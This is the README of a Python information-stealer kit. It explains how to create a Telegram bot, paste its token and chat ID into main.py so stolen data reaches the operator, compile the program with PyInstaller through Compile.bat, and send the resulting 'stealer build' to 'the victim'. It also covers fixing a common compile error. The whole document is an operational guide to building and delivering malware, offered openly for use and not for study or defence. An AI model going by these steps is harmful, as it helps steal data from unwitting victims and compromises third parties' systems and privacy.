# Stiller on Python :point_down:
# ❗❗❗ Use at own risk ❗❗❗

## Manual:

- Create a telegram bot and run it, send it any message (https://t.me/BotFather)
- Copy the bot token (After creating the bot, the botfaser will issue a token)
- Insert token between quotes in main.py (TOKEN = "YOUR TOKEN")
- Get chat id of your telegram account from the bot (https://t.me/getidsbot)
- Insert chat id between quotes in main.py file (CHAT_ID = "YOUR CHAT ID")
- Run Compile.bat

### After these steps, a stealer build will appear in the dist folder, which can be sent to the victim.

### If there is an error like this during compilation:
The 'typing' package is an obsolete backport of a standard library package and is incompatible with PyInstaller. Please pip uninstall typing then try again.
The specified file cannot be found.
The specified file cannot be found.
Press any key to continue. . .

Then we enter into the console: 
```
pip uninstall typing
```
And then enter "y"


